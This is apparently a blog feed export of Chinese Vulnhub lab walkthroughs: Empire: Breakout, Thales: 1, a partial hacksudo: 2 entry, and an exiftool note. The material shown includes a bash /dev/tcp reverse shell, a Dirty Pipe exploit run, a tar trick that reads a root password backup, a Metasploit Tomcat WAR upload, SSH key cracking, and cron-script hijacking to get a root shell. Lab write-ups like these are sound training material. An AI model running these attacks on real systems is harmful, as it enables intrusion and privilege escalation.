<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp Desktop/CVE-2021-3560.py thugger@192.168.159.154:/home/thugger</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308261923867.jpg" /></p>
<p>上传成功，赋予执行权限用 python 执行</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308261921732.jpg" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308261919568.jpg" /></p>
<p>提权成功，拿到 root 下的 flag!</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>提权</tag>
        <tag>远程控制</tag>
      </tags>
  </entry>
  <entry>
    <title>EMPIRE：BREAKOUT</title>
    <url>/2023/08/28/empire-breakout/</url>
    <content><![CDATA[<blockquote>
<p>靶机介绍及下载：<a
href="https://www.vulnhub.com/entry/empire-breakout,751/">Empire:
Breakout ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308272111549.jpg" /></p>
<p>靶机 IP：192.168.159.155</p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.159.155 -p1-65535</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308272119975.jpg" /></p>
<p>所开端口：80,139,445,10000,20000；服务http，samba【基于smb协议】</p>
<blockquote>
<p>SMB全称是Server Message
Block(服务器消息块)，又称网络文件共享系统，是一种应用层网络传输协议。SMB被广泛地应用于在计算机间共享文件、端口、命名管道和打印机等。系统上的不同应用程序可以同时读取和写入文件，并向服务器请求服务。
此外，SMB可以直接在TCP/IP或其他网络协议上运行。通过SMB，用户或任何经授权的应用程序都可以访问远程服务器上的文件或其他资源，并且可以执行读取、创建和更新数据等操作。</p>
</blockquote>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<h4 id="端口">1.3.1. 端口</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308272121074.jpg" /></p>
<p>没看到啥特殊信息……不过翻看源码，得到个加密信息</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308272123443.jpg" /></p>
<p>查了下是 Brainfuck 加密的，利用在线工具解密。<a
href="https://ctf.bugku.com/tool/brainfuck">Brainfuck/OoK加密解密 -
Bugku CTF</a></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308272124918.jpg" /></p>
<p><code>.2uqPEfj3D&lt;P'a-3</code> 不知道有啥用，暂且留着。</p>
<h4 id="和20000端口">1.3.2. 10000和20000端口</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308272132820.jpg" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308272132231.jpg" /></p>
<p>试了几次弱口令结果 IP
被封了……尝试找了下webmin的漏洞，基本都要有个用户名和密码才能进一步利用漏洞。</p>
<h4 id="目录遍历">1.3.3. 目录遍历</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308272147380.jpg" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308272147188.jpg" /></p>
<p>截至目前没有可有效利用的信息……想到139和445还没用了，它两是基于SMB协议的，所以接着扫描
smb 服务。</p>
<h3 id="smb-服务扫描">1.4. smb 服务扫描</h3>
<p>Enum4linux是用于枚举windows和Linux系统上的SMB服务的工具。Enum4linux可以发现以下内容：</p>
<ul>
<li>域和组成员</li>
<li>用户列表</li>
<li>设备上的共享(驱动器和文件夹)</li>
<li>目标上的密码策略</li>
<li>远程目标的操作系统</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux 192.168.159.155</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308272221525.jpg" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308272221148.jpg" /></p>
<p>扫到了几个用户名，猜测前面得到的<code>.2uqPEfj3D&lt;P'a-3</code>
可能是密码，挨个匹配在webmin和usermin登录试下。 经测试
<code>cyber/.2uqPEfj3D&lt;P'a-3</code>
可以从usermin【20000端口】的登录界面进去。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308272228731.jpg" /></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="usermin-登录">2.1. usermin 登录</h3>
<p>从 <a
href="https://192.168.159.155:20000/">https://192.168.159.155:20000/</a>
用
<code>cyber/.2uqPEfj3D&lt;P'a-3</code>登录，左下角发现个<code>ris:TerminalBox</code>
。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308272231293.jpg" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308272235445.jpg" /></p>
<p>拿到第一个 flag：3mp!r3{You_Manage_To_Break_To_My_Secure_Access}</p>
<h3 id="提权">2.2. 提权</h3>
<h4 id="尝试反弹-shell">2.2.1. 尝试反弹 shell</h4>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="number">192.168.159.152</span>/<span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308272307949.jpg" /></p>
<p>用起来不太舒服，还不如web端的 terminal……不过如果想通过执行漏洞 POC
提权还是需要反弹 shell的</p>
<p>考虑webmin提权，经查webmin漏洞基本涉及的是基于当前已知用户等级的RCE，即cyber用户的RCE【进行shell反弹等】，没找到提权漏洞……
考虑用 <code>find / -perm -u=s -type f 2&gt;/dev/null</code>
看看有没有可提权的命令啥的，还是没得到有价值的信息……
考虑内核漏洞提权，谷歌+百度后找到个 <a
href="https://github.com/r1is/CVE-2022-0847/tree/main">CVE-2022-0847</a></p>
<blockquote>
<p>CVE-2022-0847-DirtyPipe-Exploit CVE-2022-0847 是存在于 Linux内核 5.8
及之后版本中的本地提权漏洞。攻击者通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权
root。 CVE-2022-0847 的漏洞原理类似于 CVE-2016-5195 脏牛漏洞（Dirty
Cow），但它更容易被利用。漏洞作者将此漏洞命名为“Dirty Pipe” POC：<a
href="https://github.com/r1is/CVE-2022-0847/blob/main/Dirty-Pipe.sh">Dirty-Pipe.sh</a></p>
</blockquote>
<p>利用步骤【文件上传靶机可用 nc 】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/imfiver/CVE-2022-0847.git</span><br><span class="line"><span class="built_in">cd</span> CVE-2022-0847</span><br><span class="line"><span class="built_in">chmod</span> +x Dirty-Pipe.sh</span><br><span class="line">bash Dirty-Pipe.sh</span><br></pre></td></tr></table></figure>
<p>不过该漏洞顺利利用依赖于 gcc ，而通过测试靶机并未安装 gcc
……考虑到本地直接编译成exp上传后直接执行测试结果还是失败，依赖库缺少，如下</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">./<span class="built_in">exp</span>: /<span class="keyword">lib</span>/x86_64-linux-gnu/libc.so<span class="number">.6</span>: version `GLIBC_2<span class="number">.33</span>&#x27; <span class="keyword">not</span> <span class="built_in">found</span> (required by ./<span class="built_in">exp</span>)</span><br><span class="line">./<span class="built_in">exp</span>: /<span class="keyword">lib</span>/x86_64-linux-gnu/libc.so<span class="number">.6</span>: version `GLIBC_2<span class="number">.34</span>&#x27; <span class="keyword">not</span> <span class="built_in">found</span> (required by ./<span class="built_in">exp</span>)</span><br></pre></td></tr></table></figure>
<p>尝试用 apt-get 安装
gcc，结果还是权限不足！没思路了……接着百度+谷歌，找到了以下解决方案 cyber
目录下有个tar文件，查看权限 cyber 也可以执行该文件</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308272355871.jpg" /></p>
<p>另外找到个密码备份文件【/var/backups/.old_pass.bak】，但 cyber
没权限读取，根据权限来判断的话，应该是 root 的密码，考虑用 tar
先压缩再解压后读取</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[cyber@breakout ~]$ ./tar -cvf old_pass.tar /var/backups/.old_pass.bak</span><br><span class="line">./tar: Removing leading `/<span class="string">&#x27; from member names</span></span><br><span class="line"><span class="string">/var/backups/.old_pass.bak</span></span><br><span class="line"><span class="string">[cyber@breakout ~]$ ls</span></span><br><span class="line"><span class="string">old_pass.tar</span></span><br><span class="line"><span class="string">tar</span></span><br><span class="line"><span class="string">user.txt</span></span><br><span class="line"><span class="string">[cyber@breakout ~]$ ./tar -xvf old_pass.tar</span></span><br><span class="line"><span class="string">var/backups/.old_pass.bak</span></span><br><span class="line"><span class="string">[cyber@breakout ~]$ ls</span></span><br><span class="line"><span class="string">old_pass.tar</span></span><br><span class="line"><span class="string">tar</span></span><br><span class="line"><span class="string">user.txt</span></span><br><span class="line"><span class="string">var</span></span><br><span class="line"><span class="string">[cyber@breakout ~]$ cat var/backups/.</span></span><br><span class="line"><span class="string">var/backups/./</span></span><br><span class="line"><span class="string">var/backups/../</span></span><br><span class="line"><span class="string">var/backups/.old_pass.bak</span></span><br><span class="line"><span class="string">[cyber@breakout ~]$ cat var/backups/.old_pass.bak</span></span><br><span class="line"><span class="string">Ts&amp;4&amp;YurgtRX(=~h</span></span><br></pre></td></tr></table></figure>
<p>得到密码：<code>Ts&amp;4&amp;YurgtRX(=~h</code></p>
<h4 id="webmin-登录">2.2.2. webmin 登录</h4>
<p>同 usermin，左下角获得 terminal，读取根目录下的 flag</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308272355270.jpg" /></p>
<p>success!</p>
<h3 id="对前面内核提权漏洞再次测试">2.3. 对前面内核提权漏洞再次测试</h3>
<p>利用已知的root用户安装 gcc【通过反弹 shell 安装】，安装完后用 cyber
执行 poc.sh 测试</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308280046142.jpg" /></p>
<p>提权成功！</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>exiftool 提取图片信息</title>
    <url>/2021/11/17/exiftool%20%E6%8F%90%E5%8F%96%E5%9B%BE%E7%89%87%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<p><strong>图片信息：GPS,设备信息等</strong></p>
<p><strong>Kali 使用举例</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop/Tools<span class="comment"># git clone https: //github.com/exiftool/exiftool.git</span></span><br><span class="line">正克隆到 <span class="string">&#x27;exiftool&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 15847, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (1320/1320), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (1031/1031), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 15847 (delta 944), reused 504 (delta 287), pack-reused 14527</span><br><span class="line">接收对象中: 100% (15847/15847), 19.84 MiB | 1.06 MiB/s, 完成.</span><br><span class="line">处理 delta 中: 100% (13759/13759), 完成.</span><br><span class="line">root@kali:~/Desktop/Tools<span class="comment"># cd exiftool/</span></span><br><span class="line">root@kali:~/Desktop/Tools/exiftool<span class="comment"># ls</span></span><br><span class="line">arg_files         exiftool   Makefile.PL  perl-Image-ExifTool.spec  validate</span><br><span class="line">build_tag_lookup  fmt_files  MANIFEST     pp_build_exe.args         windows_exiftool</span><br><span class="line">Changes           html       META.json    README</span><br><span class="line">config_files      lib        META.yml     t</span><br><span class="line">root@kali:~/Desktop/Tools/exiftool<span class="comment"># ./exiftool -h</span></span><br><span class="line">Syntax:  exiftool [OPTIONS] FILE</span><br><span class="line"></span><br><span class="line">Consult the exiftool documentation <span class="keyword">for</span> a full list of options.</span><br><span class="line">root@kali:~/Desktop/Tools/exiftool<span class="comment"># ./exiftool /root/Desktop/ 2.jpg               #网上下的图片</span></span><br><span class="line">ExifTool Version Number         : 12.36</span><br><span class="line">File Name                       : 2.jpg</span><br><span class="line">Directory                       : /root/Desktop</span><br><span class="line">File Size                       : 168 KiB</span><br><span class="line">File Modification Date/Time     : 2020:07:05 19:33:26-04:00</span><br><span class="line">File Access Date/Time           : 2021:11:17 09:27:50-05:00</span><br><span class="line">File Inode Change Date/Time     : 2021:11:17 09:27:50-05:00</span><br><span class="line">File Permissions                : -rwxrw-rw-</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">JFIF Version                    : 1.01</span><br><span class="line">Resolution Unit                 : inches</span><br><span class="line">X Resolution                    : 300</span><br><span class="line">Y Resolution                    : 300</span><br><span class="line">Image Width                     : 960</span><br><span class="line">Image Height                    : 600</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)</span><br><span class="line">Image Size                      : 960x600</span><br><span class="line">Megapixels                      : 0.576 root@kali: ~/Desktop/Tools/exiftool<span class="comment"># ./exiftool /root/Desktop/32.jpg             #自己手机拍的</span></span><br><span class="line">ExifTool Version Number         : 12.36</span><br><span class="line">File Name                       : 32.jpg</span><br><span class="line">Directory                       : /root/Desktop</span><br><span class="line">File Size                       : 70 KiB</span><br><span class="line">File Modification Date/Time     : 2021:11:17 09:44:32-05:00</span><br><span class="line">File Access Date/Time           : 2021:11:17 09:52:30-05:00</span><br><span class="line">File Inode Change Date/Time     : 2021:11:17 09:52:30-05:00</span><br><span class="line">File Permissions                : -rwxrw-rw-</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">Exif Byte Order                 : Big-endian (Motorola, MM)</span><br><span class="line">Light Source                    : Unknown</span><br><span class="line">Orientation                     : Unknown (0)</span><br><span class="line">Modify Date                     : 2021:11:17 22:43:55</span><br><span class="line">JFIF Version                    : 1.01</span><br><span class="line">Resolution Unit                 : None</span><br><span class="line">X Resolution                    : 1</span><br><span class="line">Y Resolution                    : 1</span><br><span class="line">Profile CMM Type                : </span><br><span class="line">Profile Version                 : 2.1.0</span><br><span class="line">Profile Class                   : Display Device Profile</span><br><span class="line">Color Space Data                : RGB</span><br><span class="line">Profile Connection Space        : XYZ</span><br><span class="line">Profile Date Time               : 0000:00:00 00:00:00</span><br><span class="line">Profile File Signature          : acsp</span><br><span class="line">Primary Platform                : Unknown ()</span><br><span class="line">CMM Flags                       : Not Embedded, Independent</span><br><span class="line">Device Manufacturer             : </span><br><span class="line">Device Model                    : </span><br><span class="line">Device Attributes               : Reflective, Glossy, Positive, Color</span><br><span class="line">Rendering Intent                : Media-Relative Colorimetric</span><br><span class="line">Connection Space Illuminant     : 0.9642 1 0.82491</span><br><span class="line">Profile Creator                 : </span><br><span class="line">Profile ID                      : 0</span><br><span class="line">Profile Description             : sRGB</span><br><span class="line">Red Matrix Column               : 0.43607 0.22249 0.01392</span><br><span class="line">Green Matrix Column             : 0.38515 0.71687 0.09708</span><br><span class="line">Blue Matrix Column              : 0.14307 0.06061 0.7141</span><br><span class="line">Red Tone Reproduction Curve     : (Binary data 40 bytes, use -b option to extract)</span><br><span class="line">Green Tone Reproduction Curve   : (Binary data 40 bytes, use -b option to extract)</span><br><span class="line">Blue Tone Reproduction Curve    : (Binary data 40 bytes, use -b option to extract)</span><br><span class="line">Media White Point               : 0.9642 1 0.82491</span><br><span class="line">Profile Copyright               : Google Inc. 2016</span><br><span class="line">Image Width                     : 720</span><br><span class="line">Image Height                    : 960</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)</span><br><span class="line">Image Size                      : 720x960</span><br><span class="line">Megapixels                      : 0.691</span><br></pre></td></tr></table></figure>
<p><strong>windows下的类似工具：</strong> Foca</p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>信息收集</category>
      </categories>
  </entry>
  <entry>
    <title>Thales: 1</title>
    <url>/2024/04/17/Thales%201/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a href="https://www.vulnhub.com/entry/thales-1,749/">Thales: 1
~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Currently scanning: Finished!   |   Screen View: Unique Hosts         </span><br><span class="line">18 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 1080        </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">192.168.159.1   00:50:56:c0:00:08      1      60  VMware, Inc.        </span><br><span class="line">192.168.159.2   00:50:56:e0:3a:a5      8     480  VMware, Inc.         </span><br><span class="line">192.168.159.254 00:50:56:<span class="built_in">fc</span>:2d:ae      3     180  VMware, Inc.         </span><br><span class="line">192.168.159.151 00:0c:29:5c:cc:39      6     360  VMware, Inc.</span><br></pre></td></tr></table></figure>
<p>靶机：192.168.159.151</p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-17 00:41 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.151</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8c:19:ab:91:72:a5:71:d8:6d:75:1d:8f:65:<span class="built_in">df</span>:e1:32 (RSA)</span><br><span class="line">|   256 90:6e:a0:ee:d5:29:6c:b9:7b:05:db:c6:82:5c:19:bf (ECDSA)</span><br><span class="line">|_  256 54:4d:7b:e8:f9:7f:21:34:3e:ed:0f:d9:fe:93:bf:00 (ED25519)</span><br><span class="line">8080/tcp open  http    Apache Tomcat 9.0.52</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-title: Apache Tomcat/9.0.52</span><br><span class="line">MAC Address: 00:0C:29:5C:CC:39 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.21 ms 192.168.159.151</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 28.68 seconds</span><br></pre></td></tr></table></figure>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>8080 是 Apache Tomcat/9.0.52，找历史漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit tomcat</span><br></pre></td></tr></table></figure>
<p>没找到能直接利用的，需要登录后方可利用，利用 burpsuite 试试弱口令【<a
href="https://www.cnblogs.com/yyxianren/p/15701016.html">Burpsuite密码爆破(Basic认证)
- 御用闲人 - 博客园</a>，<a
href="https://github.com/TheKingOfDuck/fuzzDicts">GitHub -
TheKingOfDuck/fuzzDicts: Web Pentesting Fuzz
字典,一个就够了。</a>】，Middleware 字典即可</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404171455541.png" /></p>
<p>得 <code>tomcat:role1</code></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>可部署 war</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404171645728.png" /></p>
<p>尝试部署 war 文件来 Getshell，msf 有可直接利用的模块【<a
href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat">Tomcat
| HackTricks | HackTricks</a>】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/http/tomcat_mgr_upload</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; <span class="built_in">set</span> rhost &lt;IP&gt;</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; <span class="built_in">set</span> rport &lt;port&gt;</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; <span class="built_in">set</span> httpusername &lt;username&gt;</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; <span class="built_in">set</span> httppassword &lt;password&gt;</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; exploit</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404171650991.png" /></p>
<h3 id="提权">2.2. 提权</h3>
<p>shell 有点受限，反弹并完善个交互式 shell</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404171654901.png" /></p>
<p>获取完全的 shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> </span><br><span class="line">export TERM=xterm </span><br><span class="line"><span class="comment"># 按下 Ctrl+z 退出 nc </span></span><br><span class="line">stty raw -echo;fg </span><br><span class="line"><span class="comment"># 输入reset </span></span><br><span class="line">stty rows <span class="number">46</span> columns <span class="number">188</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404171656885.png" /></p>
<p>.ssh 的权限有点特殊，或许可利用私钥登录 thales 用户，利用 scp
将其中的私钥 id_rsa 传至 kali 破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh2john id_rsa &gt; john_id_rsa</span><br><span class="line">john john_id_rsa --wordlist=../rockyou.txt</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404171700240.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404171700241.png" /></p>
<p>尝试用私钥登录未果……</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404171704696.png" /></p>
<p>根据 thales 用户下的 notes.txt 的提示得有个
/usr/local/bin/backup.sh，可能是存在定时任务</p>
<p>backup.sh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">####################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Backup to NFS mount script.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">####################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># What to backup. </span></span><br><span class="line">backup_files=<span class="string">&quot;/opt/tomcat/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Where to backup to.</span></span><br><span class="line">dest=<span class="string">&quot;/var/backups&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create archive filename.</span></span><br><span class="line">day=$(<span class="built_in">date</span> +%A)</span><br><span class="line">hostname=$(hostname -s)</span><br><span class="line">archive_file=<span class="string">&quot;<span class="variable">$hostname</span>-<span class="variable">$day</span>.tgz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Print start status message.</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Backing up <span class="variable">$backup_files</span> to <span class="variable">$dest</span>/<span class="variable">$archive_file</span>&quot;</span></span><br><span class="line"><span class="built_in">date</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Backup the files using tar.</span></span><br><span class="line">tar czf <span class="variable">$dest</span>/<span class="variable">$archive_file</span> <span class="variable">$backup_files</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Print end status message.</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Backup finished&quot;</span></span><br><span class="line"><span class="built_in">date</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Long listing of files in $dest to check file sizes.</span></span><br><span class="line"><span class="built_in">ls</span> -lh <span class="variable">$dest</span></span><br></pre></td></tr></table></figure>
<p>脚本权限也有点异常，归属 root ，但所有用户均可编辑，写个 shell</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404171712473.png" /></p>
<p><code>cat /etc/crontab /etc/cron.d/*</code> 未查到定时任务，上传
pspy64 看看，pspy64 发现 backup.sh 确实会被定时执行</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404171717954.png" /></p>
<p>kali 开监听得 root shell</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404171717594.png" /></p>
<p>拿到 flag</p>
<h2 id="补充">3. 补充</h2>
<p>前面破解 ssh 私钥获得的密码 <code>vodka06</code> ，可在 nc 的 shell
用于 tomcat 用户切换至 thales</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404171750141.png" /></p>
<p>至于为什么 ssh 私钥登录不了，经测原因如下：</p>
<ul>
<li><strong>首先</strong>，ssh
配置文件【/etc/ssh/sshd_config】中配置的公钥是
<code>authorized_keys</code> ，而 thales 用户下公钥名为
id_rsa.pub，即需要改成 <code>authorized_keys</code> 。</li>
<li><strong>其次</strong>，<code>.ssh</code>
文件夹的权限太大，可更改权限为 <code>700</code> 。</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404171840162.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404171840163.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404171840164.png" /></p>
<p>注意，tomcat 用户没有足够的权限做出上述更改！</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>提权</tag>
        <tag>反弹 shell</tag>
      </tags>
  </entry>
  <entry>
    <title>hacksudo: 2 (HackDudo)</title>
    <url>/2024/04/02/hacksudo%202%20(HackDudo)/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/hacksudo-2-hackdudo,667/">hacksudo:
2 (HackDudo) ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 10.0.3.0/24</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> Currently scanning: Finished!   |   Screen View: Unique Hosts   </span><br><span class="line"> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240 </span><br><span class="line">____________________________________________________________________________</span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 10.0.3.1        52:54:00:12:35:00      1      60  Unknown vendor  </span><br><span class="line"> 10.0.3.2        52:54:00:12:35:00      1      60  Unknown vendor   </span><br><span class="line"> 10.0.3.3        08:00:27:f8:70:be      1      60  PCS Systemtechnik GmbH   </span><br><span class="line"> 10.0.3.6        08:00:27:f6:ff:ec      1      60  PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>
<p>靶机：10.0.3.6</p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A 10.0.3.6 -p1-65535</span><br></pre></td></tr></table></figure>
